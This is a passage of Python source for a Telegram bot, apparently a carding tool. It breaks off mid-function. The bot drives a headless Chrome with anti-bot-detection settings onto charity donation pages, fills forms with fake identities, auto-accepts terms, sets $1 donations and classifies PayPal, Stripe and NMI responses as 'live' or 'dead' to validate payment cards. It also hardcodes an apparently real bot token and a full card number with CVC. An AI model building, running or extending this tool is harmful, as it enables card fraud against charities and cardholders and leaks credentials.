# ═══════════════════════════════════════════════════════════
# ⚡ HUMAN-LIKE DONATION BOT v8.0 - Part 1/4
# ═══════════════════════════════════════════════════════════

import telebot
import time
import threading
from telebot import types
import requests, random, json, re, base64, os, gc, uuid
from datetime import datetime, timedelta
from urllib.parse import urlparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══ Selenium ═══
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.action_chains import ActionChains
    from selenium.common.exceptions import (
        TimeoutException, NoSuchElementException,
        ElementNotInteractableException, StaleElementReferenceException,
        WebDriverException, NoSuchFrameException, ElementClickInterceptedException
    )
    HAS_SELENIUM = True
except ImportError:
    HAS_SELENIUM = False
    print("⚠️ Selenium not installed! Run: pip install selenium")

try:
    from webdriver_manager.chrome import ChromeDriverManager
    HAS_WEBDRIVER_MANAGER = True
except ImportError:
    HAS_WEBDRIVER_MANAGER = False
    print("⚠️ webdriver-manager not installed! Run: pip install webdriver-manager")

# ═══ UserAgent ═══
try:
    from fake_useragent import UserAgent
    uu = UserAgent()
    HAS_FAKE_UA = True
except:
    HAS_FAKE_UA = False
    class SimpleUA:
        def __init__(self):
            self.agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            ]
        def random(self):
            return random.choice(self.agents)

# ═══ Bot Data ═══
token = '8689698569:AAGdpOlH6oRCVKJjSicleRPuIoyXgazAiMo'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6843321125
admins = ['6843321125']
OWNER_ID = 6843321125

processing_status = {}

if not os.path.exists('blockusers.txt'):
    with open('blockusers.txt', 'w') as f:
        f.write('')

# ═══ Test Card ═══
TEST_CARD = "5104040287872188|12|27|951"
TEST_CARD_NUMBER = "5104040287872188"
TEST_CARD_EXPIRY_MONTH = "12"
TEST_CARD_EXPIRY_YEAR = "27"
TEST_CARD_CVC = "951"

# ═══ Error Tracking ═══
error_counter = {'502': 0, '429': 0, '500': 0, 'timeout': 0, 'connection': 0}

def track_error(error_type):
    if error_type in error_counter:
        error_counter[error_type] += 1
        if error_counter[error_type] > 10:
            print(f"⚠️ Too many {error_type} errors! Waiting 60s...")
            time.sleep(60)
            error_counter[error_type] = 0

def reset_error_counter():
    for key in error_counter:
        error_counter[key] = 0

# ═══ Safe Send Functions ═══
def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=5):
    for i in range(retries):
        try:
            result = bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
            reset_error_counter()
            return result
        except Exception as e:
            error_str = str(e)
            if "429" in error_str:
                track_error('429')
                try:
                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time + 5, 65))
            elif "502" in error_str or "Bad Gateway" in error_str:
                track_error('502')
                time.sleep(5 * (i + 1))
            elif "500" in error_str or "Internal Server Error" in error_str:
                track_error('500')
                time.sleep(3 * (i + 1))
            elif "Timed out" in error_str or "timeout" in error_str.lower():
                track_error('timeout')
                time.sleep(2 * (i + 1))
            elif "Connection" in error_str:
                track_error('connection')
                time.sleep(3 * (i + 1))
            else:
                break
    return None

def safe_send_message(chat_id, text, parse_mode="HTML", retries=5, reply_markup=None):
    for i in range(retries):
        try:
            result = bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
            reset_error_counter()
            return result
        except Exception as e:
            error_str = str(e)
            if "429" in error_str:
                track_error('429')
                try:
                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time + 5, 65))
            elif "502" in error_str or "Bad Gateway" in error_str:
                track_error('502')
                time.sleep(5 * (i + 1))
            elif "500" in error_str or "Internal Server Error" in error_str:
                track_error('500')
                time.sleep(3 * (i + 1))
            elif "Timed out" in error_str or "timeout" in error_str.lower():
                track_error('timeout')
                time.sleep(2 * (i + 1))
            elif "Connection" in error_str:
                track_error('connection')
                time.sleep(3 * (i + 1))
            else:
                break
    return None

def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=5):
    for i in range(retries):
        try:
            with open(file_path, 'rb') as f:
                result = bot.send_document(chat_id, f, caption=caption, parse_mode=parse_mode)
            reset_error_counter()
            return result
        except Exception as e:
            error_str = str(e)
            if "429" in error_str:
                track_error('429')
                time.sleep(30)
            elif "502" in error_str:
                track_error('502')
                time.sleep(5 * (i + 1))
            else:
                break
    return None

def safe_send_photo(chat_id, file_path, caption="", parse_mode="HTML", retries=5):
    for i in range(retries):
        try:
            with open(file_path, 'rb') as f:
                result = bot.send_photo(chat_id, f, caption=caption, parse_mode=parse_mode)
            reset_error_counter()
            return result
        except Exception as e:
            error_str = str(e)
            if "429" in error_str:
                track_error('429')
                time.sleep(30)
            elif "502" in error_str:
                track_error('502')
                time.sleep(5 * (i + 1))
            else:
                break
    return None

def safe_get_file(file_id, retries=5):
    for i in range(retries):
        try:
            return bot.get_file(file_id)
        except Exception as e:
            error_str = str(e)
            if "502" in error_str:
                time.sleep(5 * (i + 1))
            elif "429" in error_str:
                time.sleep(30)
            else:
                break
    return None

def safe_download_file(file_path, retries=5):
    for i in range(retries):
        try:
            return bot.download_file(file_path)
        except Exception as e:
            error_str = str(e)
            if "502" in error_str:
                time.sleep(5 * (i + 1))
            elif "429" in error_str:
                time.sleep(30)
            else:
                break
    return None

# ═══════════════════════════════════════════════════════════
# ═══ LIVE RESPONSES (كل البوابات) ═══
# ═══════════════════════════════════════════════════════════
LIVE_RESPONSES = [
    # PayPal
    'INSUFFICIENT_FUNDS', 'Payer cannot pay', 'CHARGE 1.0', 'CHARGE 1.00$',
    'RESTRICTED_OR_INACTIVE_ACCOUNT', 'PAYEE_BLOCKED_TRANSACTION',
    'SUSPECTED_FRAUD', 'ORDER_NOT_APPROVED', 'TRANSACTION_REFUSED',
    'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED', 'CARD_DECLINED',
    'PAYMENT_DENIED', 'PAYER_CANNOT_PAY', 'DO_NOT_HONOR',
    'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE',
    'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED', 'ACCOUNT_BLOCKED_BY_ISSUER',
    'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED',
    'INVALID_TRANSACTION', 'SECURITY_VIOLATION', 'EXPIRED_CARD',
    'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE',
    'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY',
    'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
    'PAYER_BLOCKED_TRANSACTION', 'PAYER_ACCOUNT_RESTRICTED',
    'PAYER_ACCOUNT_INVALID', 'INVALID_PAYMENT_METHOD',
    'DECLINED_DUE_TO_UPDATED_ACCOUNT', 'INVALID_OR_RESTRICTED_CARD',
    'TRANSACTION_LIMIT_EXCEEDED', 'NOT_ENABLED_FOR_CARD_PROCESSING',
    'CARD_TYPE_NOT_SUPPORTED', 'PAYEE_ACCOUNT_RESTRICTED',
    'PAYEE_ACCOUNT_INVALID', 'PAYEE_ACCOUNT_LOCKED_OR_CLOSED',
    'UNSUPPORTED_INTENT', 'UNSUPPORTED_PAYMENT_INSTRUMENT',
    'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED', 'CVV2_FAILURE_INDICATOR',
    'CARD_EXPIRED', 'INVALID_CARD_NUMBER', 'INVALID_EXPIRATION_DATE',
    'CARD_NOT_SUPPORTED', 'AUTHORIZATION_DENIED', 'AUTHORIZATION_EXPIRED',
    'AUTHORIZATION_VOIDED',
    
    # Stripe
    'Your card has insufficient funds',
    'There was an issue with your donation transaction',
    'Your card was declined',
    'insufficient_funds',
    'card_declined',
    'transaction_not_allowed',
    'Your card does not support this type of purchase',
    'Your card\'s security code is incorrect',
    'Your card\'s expiration date is incorrect',
    'Your card number is incorrect',
    'Your card has expired',
    'card_error',
    'expired_card',
    'incorrect_cvc',
    'processing_error',
    'card_not_supported',
    'currency_not_supported',
    'do_not_honor',
    'lost_card',
    'stolen_card',
    'pickup_card',
    'restricted_card',
    'security_violation',
    'service_not_allowed',
    'stop_payment_order',
    'testmode_decline',
    'fraudulent',
    'merchant_blacklist',
    'Please check your payment method',
    
    # NMI
    'Insufficient Funds',
    'Card Declined',
    'Transaction Declined',
    'nmi_declined',
    'Invalid Card Number',
    'Invalid CVV',
    'Invalid Expiration',
    'Card Expired',
    'Restricted Card',
    'Call Issuer',
    'Pick Up Card',
    'Lost Card',
    'Stolen Card',
    'Invalid Transaction',
    'Transaction Not Allowed',
    'Card Not Supported',
    'Insufficient Funds Available',
    'Over Limit',
    'Refer to Card Issuer',
    
    # PayPal API
    'PAYER_CANNOT_PAY',
    'PAYER_ACTION_REQUIRED',
    'INSTRUMENT_DECLINED',
]

# ═══ DEAD RESPONSES ═══
DEAD_RESPONSES = [
    'DECLINED', 'Invalid card format',
    'Error:', 'invalid_client', 'Client Authentication failed',
    'invalid_grant', 'unsupported_grant_type', 'invalid_scope',
    'No form fields', 'No au', 'No PayPal data', 'Connection failed',
    'Decode error', 'Invalid URL', 'UserAgent', 'ImportError',
    'Expecting value', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR',
    'INVALID_REQUEST', 'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED',
    'Selenium not installed', 'Page Load Error', 'Browser Error',
    'INVALID_GATEWAY', 'UNKNOWN_SITE_RESPONSE',
    'CLOUDFLARE_DETECTED', 'CAPTCHA_DETECTED',
    'NO_DONATION_FOUND', 'NO_FORM_FOUND', 'NO_PAYMENT_METHOD',
    'Driver Setup Failed',
]

# ═══ Keyword Lists ═══
DONATE_KEYWORDS = [
    # English
    'donate', 'donation', 'donations', 'donor', 'donors',
    'give', 'giving', 'gift', 'gifts', 'contribute',
    'contribution', 'support us', 'help us', 'back us',
    'fund us', 'fundraise', 'fundraiser', 'fundraising',
    'charity', 'charitable', 'sponsor', 'sponsorship',
    'philanthropy', 'make a donation', 'make a gift',
    'give now', 'donate now', 'donate today',
    'support our', 'help support', 'support the',
    'donate to', 'give to', 'contribute to',
    'support us today', 'make a difference',
    # Arabic
    'تبرع', 'تبرّع', 'تبرعات', 'متبرع', 'متبرعين',
    'عطاء', 'خير', 'صدقة', 'صدقات', 'زكاة',
    'دعم', 'ادعم', 'ساهم', 'مساهمة', 'تمويل',
    'تبرع الآن', 'تبرع اليوم',
    # Other
    'donar', 'donación', 'donativo', 'donner', 'don',
    'spenden', 'spende', 'donare', 'donazione',
    'doar', 'doação', 'doneren', 'donatie',
]

PAYMENT_KEYWORDS = [
    'payment', 'pay', 'pay now', 'pay online',
    'checkout', 'check out', 'purchase', 'buy',
    'order', 'subscribe', 'subscription',
    'billing', 'invoice', 'transaction',
    'دفع', 'ادفع', 'سداد', 'سدد', 'شراء',
    'اشتراك', 'فاتورة', 'معاملة',
    'paypal', 'stripe', 'braintree', 'square',
    'authorize', 'authorize.net', '2checkout',
    'nmi', 'worldpay', 'adyen', 'klarna',
    'apple pay', 'google pay', 'amazon pay',
    'credit card', 'debit card', 'visa', 'mastercard',
    'بطاقة', 'بطاقة ائتمان', 'بطاقة بنكية',
    'givewp', 'give-wp', 'woocommerce', 'woo',
    'donorbox', 'justgiving', 'gofundme',
    'fundly', 'classy', 'qgiv',
]

# ═══════════════════════════════════════════════════════════
# ⚡ HUMAN-LIKE DONATION BOT v8.0 - Part 2/4
# ═══════════════════════════════════════════════════════════

class HumanLikeSelenium:
    """
    بوت ذكي يتصرف زي الإنسان:
    - يكتشف أي موقع فيه تبرع
    - يدور على الأزرار في كل مكان
    - يملأ الفورم
    - يقبل الشروط
    - يدخل الفيزا
    - يضغط دفع
    """
    
    def __init__(self, url, headless=True, progress_callback=None, screenshot_callback=None):
        self.url = url
        self.headless = headless
        self.driver = None
        self.tokens = {}
        self.html = ""
        self.form_data = {}
        self.progress_callback = progress_callback
        self.screenshot_callback = screenshot_callback
        
        self.first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        self.email = f"{random.choice(self.first_names).lower()}{random.randint(100,999)}@gmail.com"
        self.phone = f"212555{random.randint(1000, 9999)}"
        self.address = "123 Main Street"
        self.city = "New York"
        self.state = "NY"
        self.zip_code = "10001"
        self.country = "US"
    
    def progress(self, message):
        """إرسال تحديث للمستخدم"""
        print(f"📢 {message}")
        if self.progress_callback:
            try:
                self.progress_callback(message)
            except:
                pass
    
    def screenshot(self, name="screenshot"):
        """التقاط سكرين شوت"""
        try:
            if self.screenshot_callback and self.driver:
                filename = f"/tmp/{name}_{int(time.time())}.png"
                self.driver.save_screenshot(filename)
                self.screenshot_callback(filename, name)
                return filename
        except:
            pass
        return None
    
    def get_random_ua(self):
        try:
            return uu.random
        except:
            return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    
    def setup_driver(self):
        """إعداد Chrome Driver"""
        try:
            options = Options()
            
            if self.headless:
                options.add_argument('--headless=new')
            
            # Performance
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--disable-setuid-sandbox')
            options.add_argument('--disable-software-rasterizer')
            options.add_argument('--disable-extensions')
            options.add_argument('--disable-plugins')
            options.add_argument('--disable-sync')
            options.add_argument('--window-size=1920,1080')
            options.add_argument('--log-level=3')
            
            # Anti-detection
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option('useAutomationExtension', False)
            
            options.add_argument(f'user-agent={self.get_random_ua()}')
            
            # Block images for speed
            prefs = {
                "profile.managed_default_content_settings.images": 2,
                "profile.default_content_setting_values.notifications": 2,
            }
            options.add_experimental_option("prefs", prefs)
            
            # Page load strategy - سريع
            options.page_load_strategy = 'eager'
            
            # Launch
            if HAS_WEBDRIVER_MANAGER:
                try:
                    service = Service(ChromeDriverManager().install())
                    self.driver = webdriver.Chrome(service=service, options=options)
                except:
                    self.driver = webdriver.Chrome(options=options)
            else:
                self.driver = webdriver.Chrome(options=options)
            
            # Hide automation
            try:
                self.driver.execute_script(
                    "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
                )
                self.driver.execute_cdp_cmd('Network.setUserAgentOverride', {
                    "userAgent": self.get_random_ua()
                })
            except:
                pass
            
            self.driver.set_page_load_timeout(30)
            self.driver.implicitly_wait(2)
            return True
        except Exception as e:
            print(f"❌ Driver setup error: {str(e)[:100]}")
            return False
    
    def smart_wait_element(self, by, selector, timeout=10, visible=False):
        """انتظار ذكي لعنصر"""
        try:
            if visible:
                return WebDriverWait(self.driver, timeout).until(
                    EC.visibility_of_element_located((by, selector))
                )
            else:
                return WebDriverWait(self.driver, timeout).until(
                    EC.presence_of_element_located((by, selector))
                )
        except:
            return None
    
    def smart_wait_clickable(self, by, selector, timeout=10):
        """انتظار عنصر قابل للضغط"""
        try:
            return WebDriverWait(self.driver, timeout).until(
                EC.element_to_be_clickable((by, selector))
            )
        except:
            return None
    
    def click_safely(self, element):
        """ضغط آمن - يجرب كل الطرق"""
        if element is None:
            return False
        
        # Scroll للعنصر
        try:
            self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
            time.sleep(0.3)
        except:
            pass
        
        # 1. ضغط عادي
        try:
            element.click()
            return True
        except:
            pass
        
        # 2. JavaScript click
        try:
            self.driver.execute_script("arguments[0].click();", element)
            return True
        except:
            pass
        
        # 3. ActionChains
        try:
            ActionChains(self.driver).move_to_element(element).click().perform()
            return True
        except:
            pass
        
        return False
    
    def fill_safely(self, element, value):
        """ملء آمن"""
        if element is None:
            return False
        
        # Scroll
        try:
            self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
            time.sleep(0.2)
        except:
            pass
        
        # 1. Clear + send_keys
        try:
            element.clear()
            time.sleep(0.1)
            element.send_keys(str(value))
            return True
        except:
            pass
        
        # 2. JavaScript fill
        try:
            self.driver.execute_script("""
                var el = arguments[0];
                var val = arguments[1];
                el.value = val;
                el.dispatchEvent(new Event('input', {bubbles: true}));
                el.dispatchEvent(new Event('change', {bubbles: true}));
                el.dispatchEvent(new Event('blur', {bubbles: true}));
            """, element, str(value))
            return True
        except:
            pass
        
        return False
    
    def detect_cloudflare(self):
        """كشف Cloudflare"""
        try:
            title = self.driver.title.lower()
            page_source = self.driver.page_source.lower()[:5000]
            
            indicators = [
                'cloudflare', 'checking your browser',
                'just a moment', 'ddos protection',
                'verifying you are human', 'cf-challenge',
                'cf_chl_opt', 'challenge-platform',
            ]
            
            for ind in indicators:
                if ind in title or ind in page_source:
                    return True
            return False
        except:
            return False
    
    def detect_captcha(self):
        """كشف Captcha"""
        try:
            page_source = self.driver.page_source.lower()
            
            indicators = [
                'g-recaptcha', 'hcaptcha', 'recaptcha',
                'cf-turnstile', 'captcha', "i'm not a robot",
                'verify you are human', 'data-sitekey',
            ]
            
            for ind in indicators:
                if ind in page_source:
                    try:
                        els = self.driver.find_elements(By.CSS_SELECTOR,
                            '[class*="captcha"], [id*="captcha"], .g-recaptcha, .hcaptcha, [class*="turnstile"], [class*="cf-turnstile"]')
                        for el in els:
                            if el.is_displayed():
                                return True
                    except:
                        pass
            return False
        except:
            return False
    
    def quick_scan(self):
        """فحص سريع - هل الموقع فيه تبرع؟"""
        try:
            # استنى DOM
            self.smart_wait_element(By.TAG_NAME, 'body', timeout=8)
            
            # جيب النص
            page_text = self.driver.page_source.lower()
            
            # ابحث عن كلمات التبرع
            found = []
            all_words = DONATE_KEYWORDS + PAYMENT_KEYWORDS
            for kw in all_words:
                if kw.lower() in page_text:
                    found.append(kw)
                    if len(found) >= 3:
                        break
            
            if found:
                self.progress(f"✅ Found keywords: {', '.join(found[:3])}")
                return True
            return False
        except:
            return False
    
    def find_donate_buttons(self):
        """البحث عن أزرار التبرع بذكاء"""
        buttons = []
        
        try:
            # ═══ 1. ابحث في الصفحة الرئيسية ═══
            for keyword in DONATE_KEYWORDS + PAYMENT_KEYWORDS:
                try:
                    # XPath للنص
                    xpath = f"//*[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '{keyword}')]"
                    elements = self.driver.find_elements(By.XPATH, xpath)
                    for el in elements:
                        try:
                            if el.is_displayed() and el.is_enabled():
                                tag = el.tag_name.lower()
                                if tag in ['button', 'a', 'input', 'div', 'span']:
                                    # تأكد إنه مش نص عادي
                                    text = el.text.lower().strip()
                                    if text and len(text) < 100:
                                        buttons.append(el)
                        except:
                            continue
                except:
                    continue
            
            # ═══ 2. CSS Selectors ═══
            css_selectors = [
                '[class*="donate"]', '[id*="donate"]',
                '[class*="give"]', '[id*="give"]',
                '[class*="payment"]', '[id*="payment"]',
                '[class*="pay-"]', '[id*="pay-"]',
                'button[type="submit"]', 'input[type="submit"]',
                '[class*="btn-donate"]', '[class*="btn-give"]',
                '.give-btn', '.give-submit',
                '[data-action*="donate"]',
                '[data-action*="pay"]',
            ]
            
            for selector in css_selectors:
                try:
                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for el in elements:
                        try:
                            if el.is_displayed() and el.is_enabled():
                                buttons.append(el)
                        except:
                            continue
                except:
                    continue
            
            # ═══ 3. Search in iframes ═══
            try:
                iframes = self.driver.find_elements(By.TAG_NAME, 'iframe')
                for iframe in iframes:
                    try:
                        self.driver.switch_to.frame(iframe)
                        for keyword in DONATE_KEYWORDS:
                            try:
                                xpath = f"//*[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '{keyword}')]"
                                elements = self.driver.find_elements(By.XPATH, xpath)
                                for el in elements:
                                    try:
                                        if el.is_displayed() and el.is_enabled():
                                            buttons.append(el)
                                    except:
                                        continue
                            except:
                                continue
                        self.driver.switch_to.default_content()
                    except:
                        try:
                            self.driver.switch_to.default_content()
                        except:
                            pass
            except:
                pass
            
            # إزالة التكرار
            unique_buttons = []
            seen = set()
            for btn in buttons:
                try:
                    btn_id = id(btn)
                    if btn_id not in seen:
                        seen.add(btn_id)
                        unique_buttons.append(btn)
                except:
                    continue
            
            return unique_buttons
        except Exception as e:
            print(f"Error find_donate_buttons: {e}")
            return []
    
    def find_and_click_donate(self):
        """البحث عن زر التبرع وضغطه"""
        try:
            buttons = self.find_donate_buttons()
            
            if not buttons:
                self.progress("⚠️ No donate buttons found")
                return False
            
            self.progress(f"🎯 Found {len(buttons)} potential buttons")
            
            # جرب أول 5 أزرار
            for i, btn in enumerate(buttons[:5]):
                try:
                    # جيب نص الزر
                    try:
                        btn_text = btn.text[:50] if btn.text else "(no text)"
                    except:
                        btn_text = "(unknown)"
                    
                    self.progress(f"🖱️ Trying button {i+1}: {btn_text}")
                    
                    if self.click_safely(btn):
                        time.sleep(2)
                        return True
                except:
                    continue
            
            return False
        except Exception as e:
            print(f"Error find_and_click_donate: {e}")
            return False
    
    def find_form(self):
        """البحث عن أي فورم"""
        try:
            # 1. Forms
            forms = self.driver.find_elements(By.TAG_NAME, 'form')
            if forms:
                for form in forms:
                    try:
                        if form.is_displayed():
                            return form
                    except:
                        continue
            
            # 2. Input fields
            input_selectors = [
                'input[type="email"]',
                'input[type="text"]',
                'input[type="number"]',
                'input[name*="email"]',
                'input[name*="amount"]',
                'input[name*="card"]',
                'input[name*="first"]',
            ]
            
            for selector in input_selectors:
                try:
                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for el in elements:
                        if el.is_displayed():
                            # ارجع الـ parent form
                            try:
                                parent = el.find_element(By.XPATH, './ancestor::form[1]')
                                return parent
                            except:
                                return el
                except:
                    continue
            
            return None
        except:
            return None
    
    def fill_form(self):
        """ملء الفورم بذكاء"""
        try:
            # ═══ الاسم الأول ═══
            self.smart_fill([
                'input[name*="first_name"]', 'input[name*="firstname"]',
                'input[name*="fname"]', 'input[name*="give_first"]',
                'input[id*="first_name"]', 'input[id*="firstname"]',
                'input[placeholder*="First"]', 'input[placeholder*="first"]',
                'input[autocomplete="given-name"]',
            ], random.choice(self.first_names), "First Name")
            
            # ═══ الاسم الأخير ═══
            self.smart_fill([
                'input[name*="last_name"]', 'input[name*="lastname"]',
                'input[name*="lname"]', 'input[name*="give_last"]',
                'input[id*="last_name"]', 'input[id*="lastname"]',
                'input[placeholder*="Last"]', 'input[placeholder*="last"]',
                'input[autocomplete="family-name"]',
            ], random.choice(self.last_names), "Last Name")
            
            # ═══ الإيميل ═══
            self.smart_fill([
                'input[type="email"]', 'input[name*="email"]',
                'input[id*="email"]', 'input[name*="give_email"]',
                'input[placeholder*="email"]', 'input[placeholder*="Email"]',
                'input[autocomplete="email"]',
            ], self.email, "Email")
            
            # ═══ العنوان ═══
            self.smart_fill([
                'input[name*="address1"]', 'input[name*="address_1"]',
                'input[name*="address"]', 'input[id*="address"]',
                'input[placeholder*="Address"]',
                'input[autocomplete="street-address"]',
            ], self.address, "Address")
            
            # ═══ المدينة ═══
            self.smart_fill([
                'input[name*="city"]', 'input[id*="city"]',
                'input[placeholder*="City"]',
                'input[autocomplete="address-level2"]',
            ], self.city, "City")
            
            # ═══ ZIP ═══
            self.smart_fill([
                'input[name*="zip"]', 'input[name*="postal"]',
                'input[id*="zip"]', 'input[id*="postal"]',
                'input[placeholder*="ZIP"]', 'input[placeholder*="Postal"]',
                'input[autocomplete="postal-code"]',
            ], self.zip_code, "ZIP")
            
            # ═══ الهاتف ═══
            self.smart_fill([
                'input[type="tel"]', 'input[name*="phone"]',
                'input[id*="phone"]', 'input[autocomplete="tel"]',
            ], self.phone, "Phone")
            
            return True
        except Exception as e:
            print(f"Error fill_form: {e}")
            return False
    
    def smart_fill(self, selectors, value, label=""):
        """ملء ذكي - يجرب كل الـ selectors"""
        for selector in selectors:
            try:
                elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                for el in elements:
                    try:
                        if el.is_displayed() and el.is_enabled():
                            # تأكد إنه input
                            tag = el.tag_name.lower()
                            if tag not in ['input', 'textarea', 'select']:
                                continue
                            
                            # جرب الملء
                            if self.fill_safely(el, value):
                                if label:
                                    self.progress(f"📝 Filled {label}")
                                return True
                    except:
                        continue
            except:
                continue
        return False
        
        # ═══════════════════════════════════════════════════════════
# ⚡ HUMAN-LIKE DONATION BOT v8.0 - Part 2/4 (تكملة)
# ═══════════════════════════════════════════════════════════

    def accept_terms(self):
        """قبول الشروط والأحكام"""
        try:
            terms_selectors = [
                'input[type="checkbox"][name*="terms"]',
                'input[type="checkbox"][id*="terms"]',
                'input[type="checkbox"][name*="agree"]',
                'input[type="checkbox"][id*="agree"]',
                'input[type="checkbox"][name*="tos"]',
                'input[type="checkbox"][name*="consent"]',
                'input[type="checkbox"][name*="give_agree"]',
                'input[type="checkbox"][name*="gdpr"]',
                'input[type="checkbox"][name*="privacy"]',
                '.terms input[type="checkbox"]',
                '.agree input[type="checkbox"]',
                '.gdpr input[type="checkbox"]',
                '[class*="terms"] input[type="checkbox"]',
                '[class*="agree"] input[type="checkbox"]',
                '[class*="consent"] input[type="checkbox"]',
            ]
            
            clicked = 0
            for selector in terms_selectors:
                try:
                    checkboxes = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for checkbox in checkboxes:
                        try:
                            if checkbox.is_displayed() and not checkbox.is_selected():
                                # جرب الضغط على الـ checkbox
                                if self.click_safely(checkbox):
                                    clicked += 1
                                    time.sleep(0.3)
                                    continue
                                
                                # جرب الضغط على الـ label
                                try:
                                    label = checkbox.find_element(By.XPATH, './ancestor::label[1]')
                                    if self.click_safely(label):
                                        clicked += 1
                                        time.sleep(0.3)
                                except:
                                    pass
                        except:
                            continue
                except:
                    continue
            
            # ابحث عن نص "I agree" أو "I accept"
            try:
                agree_texts = self.driver.find_elements(By.XPATH,
                    "//*[contains(translate(text(), 'AGREE', 'agree'), 'i agree') or "
                    "contains(translate(text(), 'ACCEPT', 'accept'), 'i accept')]")
                for el in agree_texts:
                    try:
                        if el.is_displayed():
                            if self.click_safely(el):
                                clicked += 1
                                time.sleep(0.3)
                    except:
                        continue
            except:
                pass
            
            if clicked > 0:
                self.progress(f"☑️ Accepted {clicked} terms")
                return True
            return False
        except Exception as e:
            print(f"Error accept_terms: {e}")
            return False
    
    def set_amount(self):
        """تحديد المبلغ"""
        try:
            amount = "1.00"
            
            amount_selectors = [
                'input[name*="amount"]',
                'input[id*="amount"]',
                'input[name*="give-amount"]',
                'input[name*="give_amount"]',
                'input[placeholder*="Amount"]',
                'input[placeholder*="amount"]',
                'input[name*="value"]',
            ]
            
            for selector in amount_selectors:
                try:
                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for el in elements:
                        if el.is_displayed() and el.is_enabled():
                            if self.fill_safely(el, amount):
                                self.progress(f"💰 Amount set to ${amount}")
                                return True
                except:
                    continue
            
            # أزرار مبالغ جاهزة
            amount_buttons = [
                'button[data-amount="1"]',
                'button[data-amount="5"]',
                'a[data-amount="1"]',
                'a[data-amount="5"]',
                '[class*="amount"][data-value="1"]',
            ]
            
            for selector in amount_buttons:
                try:
                    buttons = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for btn in buttons:
                        if btn.is_displayed():
                            if self.click_safely(btn):
                                self.progress(f"💰 Amount button clicked")
                                return True
                except:
                    continue
            
            return False
        except:
            return False
    
    def select_payment_method(self):
        """اختيار طريقة الدفع - Credit Card"""
        try:
            # ابحث عن أزرار Credit Card / Card
            card_keywords = ['credit card', 'credit-card', 'debit card', 'card', 'visa', 'mastercard']
            
            for keyword in card_keywords:
                try:
                    xpath = f"//*[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '{keyword}')]"
                    elements = self.driver.find_elements(By.XPATH, xpath)
                    for el in elements:
                        try:
                            if el.is_displayed() and el.is_enabled():
                                tag = el.tag_name.lower()
                                if tag in ['button', 'a', 'input', 'label', 'div']:
                                    text = el.text.lower().strip()
                                    if text and len(text) < 100:
                                        if self.click_safely(el):
                                            self.progress(f"💳 Selected: {keyword}")
                                            time.sleep(1)
                                            return True
                        except:
                            continue
                except:
                    continue
            
            # Radio buttons
            radio_selectors = [
                'input[type="radio"][value*="card"]',
                'input[type="radio"][value*="credit"]',
                'input[type="radio"][id*="card"]',
                'input[type="radio"][id*="credit"]',
            ]
            
            for selector in radio_selectors:
                try:
                    radios = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for radio in radios:
                        if radio.is_displayed() and not radio.is_selected():
                            if self.click_safely(radio):
                                self.progress(f"💳 Selected credit card radio")
                                return True
                except:
                    continue
            
            return False
        except:
            return False
    
    def click_pay(self):
